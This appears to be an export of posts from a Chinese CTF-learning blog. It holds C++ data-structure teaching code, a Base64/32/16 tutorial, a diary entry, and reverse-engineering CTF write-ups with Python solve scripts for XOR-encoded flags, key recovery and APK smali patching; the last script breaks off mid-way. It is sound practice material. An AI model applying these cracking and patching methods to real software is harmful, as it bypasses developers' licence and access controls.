//取第i个结点的数据域 return true; } bool LocateElem_L(LinkList L, int e) //按值查找 { //在带头结点的单链表L中查找值为e的元素 LinkList p; p=L-&gt;next; while (p &amp;&amp; p-&gt;data!=e)//顺链域向后扫描，直到p为空或p所指结点的数据域等于e p=p-&gt;next; //p指向下一个结点 if(!p) return false; //查找失败p为NULL return true; } bool ListInsert_L(LinkList &amp;L, int i, int &amp;e)//单链表的插入 { //在带头结点的单链表L中第i个位置插入值为e的新结点 int j; LinkList p, s; p=L; j=0; while (p&amp;&amp;j&lt;i-1) //查找第i-1个结点，p指向该结点 { p=p-&gt;next; j++; } if (!p || j&gt;i-1)//i＞n+1或者i＜1 return false; s=new LNode; //生成新结点 s-&gt;data=e; //将新结点的数据域置为e s-&gt;next=p-&gt;next; //将新结点的指针域指向结点ai p-&gt;next=s; //将结点p的指针域指向结点s return true; } bool ListDelete_L(LinkList &amp;L, int i) //单链表的删除 { //在带头结点的单链表L中，删除第i个位置 LinkList p, q; int j; p=L; j=0; while((p-&gt;next)&amp;&amp;(j&lt;i-1)) //查找第i-1个结点，p指向该结点 { p=p-&gt;next; j++; } if (!(p-&gt;next)||(j&gt;i-1))//当i&gt;n或i&lt;1时，删除位置不合理 return false; q=p-&gt;next; //临时保存被删结点的地址以备释放空间 p-&gt;next=q-&gt;next; //改变删除结点前驱结点的指针域 delete q; //释放被删除结点的空间 return true; } void Listprint_L(LinkList L) //单链表的输出 { LinkList p; p=L-&gt;next; while (p) { cout &lt;&lt;p-&gt;data &lt;&lt;&quot;\\t&quot;; p=p-&gt;next; } cout&lt;&lt;endl; } int main() { int i,x,e,choose; LinkList L; cout &lt;&lt; &quot;1. 初始化\\n&quot;; cout &lt;&lt; &quot;2. 创建单链表（前插法）\\n&quot;; cout &lt;&lt; &quot;3. 创建单链表（尾插法）\\n&quot;; cout &lt;&lt; &quot;4. 取值\\n&quot;; cout &lt;&lt; &quot;5. 查找\\n&quot;; cout &lt;&lt; &quot;6. 插入\\n&quot;; cout &lt;&lt; &quot;7. 删除\\n&quot;; cout &lt;&lt; &quot;8. 输出\\n&quot;; cout &lt;&lt; &quot;0. 退出\\n&quot;; choose=-1; while (choose!=0) { cout&lt;&lt;&quot;请输入数字选择:&quot;; cin&gt;&gt;choose; switch (choose) { case 1: //初始化一个空的单链表 if (InitList_L(L)) cout &lt;&lt; &quot;初始化一个空的单链表!\\n&quot;; break; case 2: //创建单链表（前插法） CreateList_H(L); cout &lt;&lt; &quot;前插法创建单链表输出结果:\\n&quot;; Listprint_L(L); break; case 3: //创建单链表（尾插法） CreateList_R(L); cout &lt;&lt; &quot;尾插法创建单链表输出结果:\\n&quot;; Listprint_L(L); break; case 4: //单链表的按序号取值 cout &lt;&lt; &quot;请输入一个位置i用来取值:&quot;; cin &gt;&gt; i; if (GetElem_L(L,i,e)) { cout &lt;&lt; &quot;查找成功\\n&quot;; cout &lt;&lt; &quot;第&quot; &lt;&lt; i &lt;&lt; &quot;个元素是：&quot;&lt;&lt;e&lt;&lt; endl; } else cout &lt;&lt; &quot;查找失败\\n\\n&quot;; break; case 5: //单链表的按值查找 cout&lt;&lt;&quot;请输入所要查找元素x:&quot;; cin&gt;&gt;x; if (LocateElem_L(L,x)) cout &lt;&lt; &quot;查找成功\\n&quot;; else cout &lt;&lt; &quot;查找失败! &quot; &lt;&lt;endl; break; case 6: //单链表的插入 cout &lt;&lt; &quot;请输入插入的位置和元素（用空格隔开）:&quot;; cin &gt;&gt; i; cin &gt;&gt; x; if (ListInsert_L(L, i, x)) cout &lt;&lt; &quot;插入成功.\\n\\n&quot;; else cout &lt;&lt; &quot;插入失败!\\n\\n&quot;; break; case 7: //单链表的删除 cout&lt;&lt;&quot;请输入所要删除的元素位置i:&quot;; cin&gt;&gt;i; if (ListDelete_L(L, i)) cout&lt;&lt;&quot;删除成功!\\n&quot;; else cout&lt;&lt;&quot;删除失败!\\n&quot;; break; case 8: //单链表的输出 cout &lt;&lt; &quot;当前单链表的数据元素分别为:\\n&quot;; Listprint_L(L); cout &lt;&lt; endl; break; } } return 0; } 顺序栈基本操作#include&lt;iostream&gt; using namespace std; #define Maxsize 100 //预先分配空间，这个数值根据实际需要预估确定； typedef struct SqStack { int *base; //栈底指针 int *top; //栈顶指针 }SqStack; bool InitStack(SqStack &amp;S) //构造一个空栈S { S.base = new int[Maxsize];//为顺序栈分配一个最大容量为Maxsize的空间 if (!S.base) //空间分配失败 return false; S.top=S.base; //top初始为base，空栈 return true; } bool Push(SqStack &amp;S, int e) // 插入元素e为新的栈顶元素 { if (S.top-S.base == Maxsize) //栈满 return false; *(S.top++) = e; //元素e压入栈顶，然后栈顶指针加1，等价于*S.top=e; S.top++; return true; } bool Pop(SqStack &amp;S, int &amp;e) //删除S的栈顶元素，暂存在变量e中 { if (S.base == S.top) //栈空 return false; e = *(--S.top); //栈顶指针减1，将栈顶元素赋给e 等价于S.top--; e=*S.top; return true; } int GetTop(SqStack S) //返回S的栈顶元素，栈顶指针不变 { if (S.top != S.base) //栈非空 return *(S.top - 1); //返回栈顶元素的值，栈顶指针不变 else return -1; } int main() { int n,x; SqStack S; InitStack(S);//初始化一个顺序栈S cout &lt;&lt;&quot;请输入元素个数n：&quot; &lt;&lt;endl; cin&gt;&gt;n; cout &lt;&lt;&quot;请依次输入n个元素，依次入栈：&quot; &lt;&lt;endl; while(n--) { cin&gt;&gt;x; //输入元素 Push(S, x); } cout &lt;&lt;&quot;元素依次出栈：&quot; &lt;&lt;endl; while(S.top!=S.base)//如果栈不空，则依次出栈 { cout&lt;&lt;GetTop(S)&lt;&lt;&quot;\\t&quot;;//输出栈顶元素 Pop(S, x); //栈顶元素出栈 } return 0; } 链栈基本操作#include&lt;iostream&gt; using namespace std; typedef struct Snode { int data; //数据域 struct Snode *next; //指针域 }Snode,*LinkStack; bool InitStack(LinkStack &amp;S) //构造一个空栈S { S=NULL; return true; } bool Push(LinkStack &amp;S, int e) //在栈顶插入元素e { LinkStack p; p = new Snode; //生成新结点 p-&gt;data = e; //将e放在新结点数据域 p-&gt;next = S; //将新结点的指针域指向S，即将S的地址赋值给新结点的指针域 S = p; //修改栈顶指针为p return true; } bool Pop(LinkStack &amp;S, int &amp;e) //删除S的栈顶元素，用e保存其值 { LinkStack p; if (S==NULL) //栈空 return false; e=S-&gt;data; //将栈顶元素赋给e p=S; //用p保存栈顶元素地址，以备释放 S=S-&gt;next; //修改栈顶指针，指向下一个结点 delete p; //释放原栈顶元素的空间 return true; } int GetTop(LinkStack S) //返回S的栈顶元素，不修改栈顶指针 { if (S!=NULL) //栈非空 return S-&gt;data; //返回栈顶元素的值，栈顶指针不变 else return -1; } int main() { int n,x; LinkStack S; InitStack(S);//初始化一个顺序栈S cout &lt;&lt;&quot;请输入元素个数n：&quot; &lt;&lt;endl; cin&gt;&gt;n; cout &lt;&lt;&quot;请依次输入n个元素，依次入栈：&quot; &lt;&lt;endl; while(n--) { cin&gt;&gt;x; //输入元素 Push(S, x); } cout &lt;&lt;&quot;元素依次出栈：&quot; &lt;&lt;endl; while(S!=NULL)//如果栈不空，则依次出栈 { cout&lt;&lt;GetTop(S)&lt;&lt;&quot;\\t&quot;;//输出栈顶元素 Pop(S, x); //栈顶元素出栈 } return 0; } 二叉树的创建#include &lt;iostream&gt; using namespace std; typedef struct Bnode /*定义二叉树存储结构*/ { char data; struct Bnode *lchild,*rchild; }Bnode,*Btree; void createtree(Btree &amp;T) /*创建二叉树函数*/ { char check; /*判断是否创建左右孩子*/ T=new Bnode; cout&lt;&lt;&quot;请输入结点信息:&quot;&lt;&lt;endl; /*输入根结点数据*/ cin&gt;&gt;T-&gt;data; cout&lt;&lt;&quot;是否添加 &quot;&lt;&lt;T-&gt;data&lt;&lt;&quot;的左孩子? (Y/N)&quot;&lt;&lt;endl; /*询问是否创建T的左子树*/ cin&gt;&gt;check; if(check==&apos;Y&apos;) createtree(T-&gt;lchild); else T-&gt;lchild=NULL; cout&lt;&lt;&quot;是否添加&quot;&lt;&lt;T-&gt;data&lt;&lt;&quot;的右孩子? (Y/N)&quot;&lt;&lt;endl; /*询问是否创建T的右子树*/ cin&gt;&gt;check; if(check==&apos;Y&apos;) createtree(T-&gt;rchild); else T-&gt;rchild=NULL; return; } int main() { Btree mytree; createtree(mytree);/*创建二叉树*/ return 0; } 二叉树的层次遍历#include &lt;iostream&gt; #include &lt;queue&gt; //引入队列头文件 using namespace std; typedef struct Bnode /*定义二叉树存储结构*/ { char data; struct Bnode *lchild,*rchild; }Bnode,*Btree; void Createtree(Btree &amp;T) /*创建二叉树函数*/ { //按先序次序输入二叉树中结点的值（一个字符），创建二叉链表表示的二叉树T char ch; cin &gt;&gt; ch; if(ch==&apos;#&apos;) T=NULL; //递归结束，建空树 else { T=new Bnode; T-&gt;data=ch; //生成根结点 Createtree(T-&gt;lchild); //递归创建左子树 Createtree(T-&gt;rchild); //递归创建右子树 } return; } bool Leveltraverse(Btree T) //层次遍历 { Btree p; if(!T) return false; queue&lt;Btree&gt;Q; //创建一个普通队列(先进先出)，里面存放指针类型 Q.push(T); //根指针入队 while(!Q.empty()) //如果队列不空 { p=Q.front();//取出队头元素 Q.pop(); //队头元素出队 cout&lt;&lt;p-&gt;data&lt;&lt;&quot;\\t&quot;; if(p-&gt;lchild) Q.push(p-&gt;lchild); //左孩子指针入队 if(p-&gt;rchild) Q.push(p-&gt;rchild); //右孩子指针入队 } return true; } int main() { Btree mytree; cout&lt;&lt;&quot;按先序次序输入二叉树中结点的值（孩子为空时输入#），创建一棵二叉树&quot;&lt;&lt;endl; Createtree(mytree);//创建二叉树 cout&lt;&lt;endl; cout&lt;&lt;&quot;二叉树的层次遍历结果：&quot;&lt;&lt;endl; Leveltraverse(mytree);//层次遍历二叉树 return 0; }","categories":[],"tags":[{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"http://leo.dropsec.xyz/tags/数据结构与算法/"}]},{"title":"校赛(Reverse) wp","slug":"校赛-Reverse-wp","date":"2017-12-07T11:39:37.000Z","updated":"2018-07-30T13:34:41.954Z","comments":true,"path":"2017/12/07/校赛-Reverse-wp/","link":"","permalink":"http://leo.dropsec.xyz/2017/12/07/校赛-Reverse-wp/","excerpt":"西普杯2017年中原工学院第四届信息安全与网络攻防竞赛 Reverse 题解(待完善)","text":"西普杯2017年中原工学院第四届信息安全与网络攻防竞赛 Reverse 题解(待完善) 一、简单的Re 100下载链接题目没有可用的hint 那就开始吧 是一个让输入key的exe拉进IDA找关键点思路很简单 就是一个简单的异或 容易写出脚本 from __future__ import print_function a = [53,63,50,52,40,1,96,37,54,103,32,58,61,52,12,98,32,12,102,60,12,58,61,39,54,97,54,102,39,33,63,61,52,46] for i in(a): print(chr(i^0x53),end= &quot;&quot;) 运行结果 flag{R3ve4sing_1s_5o_inte2e5trlng} 二、来自计算机七号的挑（song）战（fen）150下载链接这是hint 目前不知道有什么用 运行程序看看其实也就是找flag的拉进IDA看看 容易找到关键代码乍一看 貌似思路也很简单 就是一个简单的异或 这是第一反应 就先这样写下脚本 from __future__ import print_function v17 = &quot;C064MrRbj2hiq6F5lg28l17D75I9523O6l3FR8rkOm8NZUN4OhE7KekMq3m8VuG1SG1FUBlBl4k714w9PO3t5151OxGipc4sX9XE&quot; v17_base = [22,25,23,21,24,28,26,26,27,29,30,20,18,19,31] a = [239,69,28,23,56,51,61,45,108,10,83,45,74,65,25] for i in range(len(a)): print (chr(((a[i]^ord(v17[v17_base[i]]))-7)^7),end=&quot;&quot;) 运行结果 �nV print (chr(((a[i]^ord(v17[v17_base[i]]))-7)^7),end=&quot;&quot;) ValueError: chr() arg not in range(256) 这是第一反应写出来的脚本 按照自己的想法就应该得到flag（尽管需要进一步排序） 但是明显这是错误的 基本可以锁定错误出在V22那个数组 可能是自己想当然的认为v22就是V17那个字符串第一个字符从17开始数的第22个吧 事实也证明自己太天真了 没办法 只能去OD里跟出V22那个比较的数组了先在OD里找到对应输入字符串的地方 输入15个字符 a–o 然后一步步F8跟踪首先会遇到15次循环 对应IDA里的异或7 +7处理 可先F4跳过就这样 可以跟踪到15个用来比较的字符 跟踪过程中需要修改标志位不要让其跳转j8lbgFDD3q4r04i 为15个跟踪到的字符然后修改上面的脚本 from __future__ import print_function v22 = &quot;j8lbgFDD3q4r04i&quot; a = [239,69,28,23,56,51,61,45,108,10,83,45,74,65,25] for i in range(len(a)): print (chr(((a[i]^ord(v22[i]))-7)^7),end=&quot;&quot;) 运行结果 yqni_iue_sg_tin 看着像是正确的字符了 然后不要忘了按照v2数组的顺序排起来yin_que_si_ting有意思啦 ok flag{yin_que_si_ting}现在知道hint走错片场就是顺序错了的意思。 收获：IDA反编译出来的if()里的顺序就是程序执行时比较的顺序 时刻注意flag排序问题 三、Android_B 150下载链接一个安卓题目 模拟器打开看一下点击 看flag 没反应 结合hint 应该是出题人把butto的click功能给false了，那么我们只要找到smail文件的关键位置把false改成true就行了用APK改之理打开 找到关键点然后把0x0改成0x1 保存 编译生成APK 然后相同目录下出现了新生成的APK模拟器打开 需要先把之前那个卸载掉重新安装生成的点击 看到了flagFlag:Hfnos%lywv*N78然后根据hint，提交MD5就OK 四、破解快乐 200下载链接你好，这是我的hint。 事实证明hint很重要，如果提示很明显的话，一定要盯紧。后缀为jar 是 Java 的一种文档格式用jd-gui来反编译Java写的程序跟着main走 先找main发现有两个main 哪一个才是有用的(继续跟)呢都点开看看 发现第二个有明显的输入KEY字符串提示so 跟下去 发现连续几个关键函数 KEY长度为19 思路也不是很复杂 主要是把思路连贯起来仿照Java代码就可以写出py脚本 def chuli(a): if a &gt; 2: return chuli(a-1) + chuli(a-2) else: return 1 z1 = 0 str1 = &quot;vÈ¾¤ÊÊ¬ÆÆÊvÌ¤Ê²Ê²ÀÎ¤¨¸¬&quot; str2 = &quot;&quot; for i in str1: str2+=chr((ord(i)&gt;&gt;1)+15) str3 = &quot;&quot; for z2 in range(4): for z3 in range(4): str3+=str2[chuli(z1+z3)%len(str1)] z1+=5 print(str3) 运行结果 sssntrtktceaakJr 运行结果长度为 16 不到19集合上面两个循环次数为4的for循环 与+5操作可知进行对比的数组下标为0 1 2 3 5 6 7 810 11 12 13 15 16 17 18然后 然后你需要把空着的下表为4 9 14的元素补上其实这里是不用猜测的 题目上有提示 只要你能看到并且get到 （看到没get到就难受了）所以 sssn-trtk-tcea-akJr哦了 flag{sssn-trtk-tcea-akJr}（注意把-换成任何字符都会提示正确，因为这三位程序没对比，但是提交是错的。另外，根据生活经验，输注册码的时候格式都是-连起来的） 【唯一的问题在于从jd-gui中复制奇怪字符串的时候Ctrl+c不出来，但是有些人可以，不知道为什么】 五、Android2 200下载链接一个安卓题目附带一个命名为Key的enc文件 没有有用的提示模拟器打开 软件名字为图片加密 作用就是用来加密解密图片 不过解密图片程序会崩溃那就用Jeb打开看看代码关键代码是这一点，解密内没有代码，他的重要操作就是异或，异或可以，但是下面有图片验证，那么我们先把Key.enc后缀改为图片后缀，然后拉到模拟器再次加密，试试看嘛。然后弹出字符串显示加密后文件的保存位置找到这个位置 改成图片后缀 打开看看根据经验能判断出来是base16 解下码就行了 import base64 a = &apos;666C61677B41706B5F776934685F313361356531365F31735F46756E6E797D&apos; print (base64.b16decode(a)) 运行结果 flag{Apk_wi4h_13a5e16_1s_Funny} 小小提示：Base64：a-z、A-Z、0-9、+、/ (=垫字符)Base32：A-Z、234567Base16：ABCDEF、0-9 六、Maze 300下载链接然后exe程序不能正常运行老套路 祭出WinHex或010发现PE头有误 修改之前就ok了 然后就可以正常运行程序接下来的操作请看下面这个链接(我目前还没搞特别懂，彻底理解之后再更新) 主要writeup在此 以上是Reverse的题解 下面补下PWN题和Crypto题 PWN 一起来”胖“呀！ 300下载链接 (目前还未深入学习PWN题，暂且记下，方便各位大佬试手，日后更新) Crypto 密码学 100下载链接结合hint:听说凯撒大帝喜欢跳栅栏？跳跳跳跳跳？猜测是凯撒 栅栏双层加密 在线解密看看呗先用栅栏接下看看 根据hint中有5个跳，暂且把每组字数设为5 然后解密然后再拿栅栏解密的结果进行凯撒解密然后就看到了 但是请不要激动 凯撒解密的时候把大小写统一成小写了 你还需要手动把对应的大写字母给变回大写 so flag为：flag{You_1Re_C1eVer}我当时做的时候也忽略了这个 贝斯家族 150下载链接hint:想挑战贝斯家族36位64大将和一位16元帅团结的权威？你可以试试。根据提示猜测 flag经过了36次base64加密，又经过一次base16加密脚本如下： import base64 f=open(&quot;E:dd.txt&quot;,&apos;r&apos;) flag = f.read() flag = base64.b16decode(flag) for i in range(36): flag=base64.b64decode(flag) print(flag) 运行结果：b&apos;flag{B3i5i_1s_A_G00d_9amily}&apos; Let’s_go 250下载链接 (目前还未深入学习RSA，暂且记下，方便各位大佬试手，日后更新)","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://leo.dropsec.xyz/tags/CTF/"}]},{"title":"Just XXXX XXXX","slug":"Just-XXXX-XXXX","date":"2017-12-01T12:06:40.000Z","updated":"2018-07-30T13:33:40.083Z","comments":true,"path":"2017/12/01/Just-XXXX-XXXX/","link":"","permalink":"http://leo.dropsec.xyz/2017/12/01/Just-XXXX-XXXX/","excerpt":"还好，只是最近有点压抑、有点虚。","text":"还好，只是最近有点压抑、有点虚。 我还是那个我 遇事表面镇静而心里沉不下太多事的我 大了很多事没有之前那样在乎了然而有时候也会纠结那些不在乎的事甚至抓狂 手在不由自主的颤腿在不由自主的抖 其实最近过的挺好生活很平静 只不过还要努力按时完成作业深入理解每一个知识点提高学习效率不做好人 做好自己 真的最近我过的挺好只是有点压抑、有点虚","categories":[],"tags":[{"name":"洋流","slug":"洋流","permalink":"http://leo.dropsec.xyz/tags/洋流/"}]},{"title":"第十二周 Reverse题目简单整理","slug":"第十二周-Reverse题目简单整理","date":"2017-12-01T11:08:52.000Z","updated":"2018-07-30T13:32:59.006Z","comments":true,"path":"2017/12/01/第十二周-Reverse题目简单整理/","link":"","permalink":"http://leo.dropsec.xyz/2017/12/01/第十二周-Reverse题目简单整理/","excerpt":"明天有个校赛，组长让我们简单整理下入坑以来所做的逆向题目类型。","text":"明天有个校赛，组长让我们简单整理下入坑以来所做的逆向题目类型。 (包括Windows 、 Linux and Android，其主要解题思想大致相似) 01X00 比较(strcmp)类 【大部分题目】00X01没有数据处理的比较这种题目重点在于找到字符比较的（双方）代码，一般不会很难。 00X02有数据处理的比较(包括脱壳、加密…）这类题目对数据的处理方式很多，重点在于找到关键代码处，并能分析出程序对数据所做的处理，然后逆向思维写出脚本得到flag。此类题目有简单的也有难的，难一点的题目分析过程会繁琐一点，也可能会有出题者设下的陷阱。 02X00 工具类这类题目一般正常思维去做会比较复杂，有适合这种题目的一些工具能简单快速解答，重点在于事前的经验积累。 03X00 脑洞(趣味)类这类题目会结合一些现代性元素或技术，做题时需要有一些脑洞(jing yan)，克服了这个拿下题目也就不成问题了。比如看到过的题目：MCTF被IDA支配的恐惧、分享会题目我是透明的而且没有按钮、syc山寨QQ、LCTF魂斗罗、MCTF_2048 …… 04X00 查看资源类这种题目一般也比较好玩，也可以属于脑洞(趣味)类题目。需要使用资源查看类的软件(如：studype+)找到flag,flag一般存在与一张图片上。如：MCTF_蓝瓶的钙 05X00 文件操作类这种题目一般是对整个程序进行了处理，需要用到文件读写，把处理后的程序还原回来。常常用到Winhex 总结其实这五大类题目都是相互联系、相互融合的，并不能简单地划分。重要的是需要我们多练习、多感悟、多总结经验，另外还要学会有根据的进行猜测。归为一句话那就是：多学习。( $ _ $ )","categories":[],"tags":[{"name":"Reverse","slug":"Reverse","permalink":"http://leo.dropsec.xyz/tags/Reverse/"}]},{"title":"第十一周 Base64|Base32|Base16","slug":"第十一周-Base64-Base32-Base16","date":"2017-11-22T05:36:18.000Z","updated":"2018-07-30T13:32:04.271Z","comments":true,"path":"2017/11/22/第十一周-Base64-Base32-Base16/","link":"","permalink":"http://leo.dropsec.xyz/2017/11/22/第十一周-Base64-Base32-Base16/","excerpt":"来，了解一下Base家族。","text":"来，了解一下Base家族。 一、Base64简介Base64是网络上最常见的用于传输8Bit字节码的编码方式之一，是一种基于64个可打印字符来表示二进制数据的表示方法。 Base64编码一般有下面两个用途： a）所有的二进制文件，都可以因此转化为可打印的文本编码（都变成ASCII码可打印字符），使用文本软件进行编辑；b）能够对文本进行简单的加密。 说白了，一段由0和1组成的串或文件，都能按照Base64的编码规则转换成一段由64个字符任意组合的串。 Base64编码规则所谓Base64，就是说选出64个字符—-小写字母a-z、大写字母A-Z、数字0-9、符号”+”、”/“（再加上作为垫字的”=”，实际上是65个字符）—-作为一个基本字符集。然后，其他所有符号都转换成这个字符集中的字符。 具体来说，转换方式可以分为四步: 第一步，将每三个字节作为一组，一共是24个二进制位第二步，将这24个二进制位分为四组，每个组有6个二进制位第三步，在每组前面加两个00，扩展成32个二进制位，即四个字节第四步，根据下表，得到扩展后的每个字节的对应符号，这就是Base64的编码值 Base64将三个字节转化成四个字节，因此Base64编码后的文本，会比原文本大出三分之一左右。 Base64编码映射表： base64中包含大写字母（A-Z）、小写字母（a-z）、数字0——9以及+/ Base64编码的一个例子举一个具体的实例，演示英语单词Man如何转成Base64编码 第一步，”M”、”a”、”n”的ASCII值分别是77、97、110，对应的二进制值是01001101、01100001、01101110，将它们连成一个24位的二进制字符串010011010110000101101110。第二步，将这个24位的二进制字符串分成4组，每组6个二进制位：010011、010110、000101、101110。第三步，在每组前面加两个00，扩展成32个二进制位，即四个字节：00010011、00010110、00000101、00101110。它们的十进制值分别是19、22、5、46。第四步，根据上表，得到每个值对应Base64编码，即T、W、F、u。 如果字节数不足三，则这样处理： a）二个字节的情况：将这二个字节的一共16个二进制位，按照上面的规则，转成三组，最后一组除了前面加两个0以外，后面也要加两个0。这样得到一个三位的Base64编码，再在末尾补上一个”=”号。比如，”Ma”这个字符串是两个字节，可以转化成三组00010011、00010110、00010000以后，对应Base64值分别为T、W、E，再补上一个”=”号，因此”Ma”的Base64编码就是TWE=。 b）一个字节的情况：将这一个字节的8个二进制位，按照上面的规则转成二组，最后一组除了前面加二个0以外，后面再加4个0。这样得到一个二位的Base64编码，再在末尾补上两个”=”号。比如，”M”这个字母是一个字节，可以转化为二组00010011、00010000，对应的Base64值分别为T、Q，再补上二个”=”号，因此”M”的Base64编码就是TQ==。 再举一个中文的例子，汉字”严”如何转化成Base64编码？这里需要注意，汉字本身可以有多种编码，比如gb2312、utf-8、gbk等等，每一种编码的Base64对应值都不一样。下面的例子以utf-8为例。 首先，”严”的utf-8编码为E4B8A5，写成二进制就是三字节的”11100100 10111000 10100101”。将这个24位的二进制字符串，按照第3节中的规则，转换成四组一共32位的二进制值”00111001 00001011 00100010 00100101”，相应的十进制数为57、11、34、37，它们对应的Base64值就为5、L、i、l。 所以，汉字”严”（utf-8编码）的Base64值就是5Lil。 Base64小总结：（1）Base64将三个字节转化成四个字节，因此Base64编码后的文本，会比原文本大出三分之一左右 （2）对于不满3个字节的东东，就需要加上base64编码中的垫字符(=)来补充 （3）Base64编码是可逆的，所以有Base64编码(encode)和解码(decode) （4）Base64主要不是加密，它主要的用途是把一些二进制数转成普通字符用于网络传输 （因为一些二进制字符在传输协议中属于控制字符，不能直接传送）。 另外，还有一些系统中只能使用ASCII字符。Base64就是用来将非ASCII字符的数据转换成ASCII字符的一种方法。 base64其实不是安全领域下的加密解密算法。虽然有时候经常看到所谓的base64加密解密。其实base64只能算是一个编码算法，对数据内容进行编码来适合传输。 Base64在线编码解码 二、Base32和Base16在Base家族中还有Base32和Base16，其实Base32/Base16和Base64目的是一样的，只是具体的编码规则的不一样罢了。Base32编码将二进制文件转换成由32个ASCII字符组成的文本；Base16编码则将二进制文件转换成由16个字符组成的文本。 Base32编码映射表：Base32中只有大写字母（A-Z）和数字234567 Base16编码映射表：Base16中只有数字0-9以及大写字母ABCDEF 小小总结：Base64编码是用64（2的6次方）个ASCII字符来表示256（2的8次方）个ASCII字符，也就是三位二进制数组经过编码后变为四位的ASCII字符显示，长度比原来增加1/3。 同样，Base32就是用32（2的5次方）个特定ASCII码来表示256个ASCII码。所以，5个ASCII字符经过Base32编码后会变为8个字符（公约数为40），长度增加3/5.不足8n用“=”补足。 Base16就是用16（2的4次方）个特定ASCII码表示256个ASCII字符。1个ASCII字符经过Base16编码后会变为2个字符，长度增加一倍。不足2n用“=”补足 参考链接：http://blog.csdn.net/instruder/article/details/5963344http://www.ruanyifeng.com/blog/2008/06/base64.html","categories":[],"tags":[{"name":"Reverse","slug":"Reverse","permalink":"http://leo.dropsec.xyz/tags/Reverse/"}]},{"title":"第十周 透明&&wcstok() wp","slug":"第十周-透明-wcstok-wp","date":"2017-11-16T23:48:23.000Z","updated":"2018-07-30T13:31:43.204Z","comments":true,"path":"2017/11/17/第十周-透明-wcstok-wp/","link":"","permalink":"http://leo.dropsec.xyz/2017/11/17/第十周-透明-wcstok-wp/","excerpt":"分别是2016极客大挑战与2017 ISCC的题目多做题，积累经验 Fuck the rest.","text":"分别是2016极客大挑战与2017 ISCC的题目多做题，积累经验 Fuck the rest. 一、我是透明的而且没有按钮题目下载链接 这是一个Windows窗体程序，并没有给出确认按钮。首先分辨出来这是个窗口而不是对话框，于是可以知道这是通过注册窗口类实现的。找到了窗口类就可以发现主消息处理函数，从中发现只要收到5次点击消息就会对输入进行验证，而验证使用了极其简单的逐位对比，调试跟一遍就可以看到flag。IDA静态分析在于找到关键点。 name = &quot;Syclover&quot; //题目已知 key = [11,70,23,32,32,51,17,44] flag = &quot;&quot; for i in range(len(name)): flag = flag+chr(ord(name[i])-key[i]) print flag 运行结果：H3LLOCTF 二、CrackMe题目下载链接 查壳后无壳，打开运行就出现了try again~可知这是一个对话框，不同于上一题。拉进IDA分析看看，找到关键这是主函数，根据谷歌的教导，RegOpenKeyExW函数是用来读取注册表的，这个程序通过注册表项：“HEEY_CURRENT_USER\\SOFTWARE\\ISCC\\flag”获取输入，sub_401210为判断函数，跟进去分析 int __usercall sub_401210@&lt;eax&gt;(char *a1@&lt;edi&gt;) { int v1; // eax@1 char *v2; // ecx@1 __int16 v3; // dx@2 wchar_t *v4; // eax@9 wchar_t *v5; // eax@11 unsigned int v6; // eax@11 wchar_t *v7; // eax@12 wchar_t *v8; // eax@13 int result; // eax@14 v1 = unknown_libname_1(50); v2 = a1; do // 这块代码没有什么意义，没有改变字符串 { v3 = *(_WORD *)v2; *(_WORD *)&amp;v2[v1 - (_DWORD)a1] = *(_WORD *)v2; v2 += 2; } while ( v3 ); result = 0; if ( wcslen((const unsigned __int16 *)v1) == 25 &amp;&amp; 123 == *(_WORD *)(v1 + 8) // flag长为25位，并且形式是xxxx{xxx_x_xxxx_xxxxxxxx} &amp;&amp; 95 == *(_WORD *)(v1 + 16) &amp;&amp; 95 == *(_WORD *)(v1 + 20) &amp;&amp; 95 == *(_WORD *)(v1 + 30) &amp;&amp; 125 == *(_WORD *)(v1 + 48) ) { wcstok((wchar_t *)v1, L&quot;{_}&quot;); //wcstok()将字符串v1中{}内的字符用_分割成若干段 v4 = wcstok(0, L&quot;{_}&quot;); //第一小段 if ( *(_DWORD *)v4 == 6815860 &amp;&amp; 52 == v4[4] ) //flag[5:6] == ‘th’ { v5 = wcstok(0, L&quot;{_}&quot;); v6 = wtoi(v5); // 数字型字符串转为整数 if ( v6 &gt;&gt; 1 == v6 - 2 ) // 3,4都可以，根据52 == v4[4]可以具体判断 flag[9]=4 { v7 = wcstok(0, L&quot;{_}&quot;); if ( sub_401000(v7) ) //跟进去 判断此函数为MD5 查询为your，确定flag[11:14] == ‘your’ { v8 = wcstok(0, L&quot;{_}&quot;); if ( sub_401180(v8) ) //进去是一个简单的异或 简单脚本运行一下 结果为register result = 1; } } } } return result; } 然后得到这个 {th _4_your_register} 0123456789012345678901234 猜测前四位是flag,最后的最后 只差flag[7]了，然后整体读一下，聪明的你就知道flag[7]是什么了OK flag{thx_4_your_register} 总结下这个题： 分析过程中遇到不懂的函数就查找资料 大胆根据线索进行猜测 补充：C语言位操作运算符 &amp; 按位与运算，如：1010 &amp; 1100 = 1000 | 按位或运算，如：1010 | 1100 = 1110 ~ 非运算，如：a = 1010; ~a = 0101 &lt;&lt;左移，如：1110 &lt;&lt; 1 = 1100 &gt;&gt;右移，如：1000 &gt;&gt; 1 = 0100","categories":[],"tags":[{"name":"Reverse","slug":"Reverse","permalink":"http://leo.dropsec.xyz/tags/Reverse/"}]},{"title":"第九周 第八届极客大挑战精选题目 wp","slug":"第九周-第八届极客大挑战精选题目-wp","date":"2017-11-10T00:51:06.000Z","updated":"2018-07-30T13:31:19.330Z","comments":true,"path":"2017/11/10/第九周-第八届极客大挑战精选题目-wp/","link":"","permalink":"http://leo.dropsec.xyz/2017/11/10/第九周-第八届极客大挑战精选题目-wp/","excerpt":"又是一周过去了，好快，简单总结下着这周学到的新姿势吧(Xortool)。附：CTF工具集合安装脚本操作姿势","text":"又是一周过去了，好快，简单总结下着这周学到的新姿势吧(Xortool)。附：CTF工具集合安装脚本操作姿势 一、CM_2.exe题目下载链接 下载好题目之后发现不能正常运行结合题目提示可知程序被处理过(xor)so,要想能正常运行，就需要逆处理先用WinHex查看一下程序的十六进制数据发现明显与正常的exe程序不一样然后随便用WinHex再打开一个正常的exe程序对比其数据观察 由于一个非0数据与0异或(xor)等于这个数可以发现第三行F2 A4 E2 B7 53 87一直循环出现 所以很大可能做的处理就是拿这6个数六个六个的去与整个文件异或我们需要找到哪一个数据是六个中的第一个经过观察或计算会发现顺序是53 87 F2 A4 E2 B7搞懂做的处理然后就是写脚本了 key = [0x53,0x87,0xf2,0xa4,0xe2,0xb7] f = open(&apos;E://CM_2.exe&apos;,&apos;rb&apos;) //打开的文件名与其路径 txt = f.read() outfile = open(&apos;E://out.exe&apos;,&apos;wb&apos;) 